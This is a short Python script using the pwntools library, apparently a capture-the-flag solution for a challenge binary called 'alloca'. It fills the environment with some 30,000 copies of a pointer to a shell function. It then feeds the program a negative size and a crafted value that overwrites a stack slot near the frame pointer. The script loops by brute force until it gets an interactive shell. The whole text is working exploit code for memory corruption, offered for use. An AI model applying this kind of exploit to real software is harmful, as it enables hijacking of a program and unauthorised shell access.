
from pwn import *

# overwrite $ebp-0x4 with ret.
# bruteforce the program so ret will contain env, which is sprayed with pointers to shell function
ret = "-4759552"
spray = p32(0x80485ab)*30000
env = {str(a):spray for a in range(12)}

while True:  # Took me about 12 tries
  p = process('./alloca', env=env)
  p.sendline('-68')
  p.sendline(ret)
  p.interactive()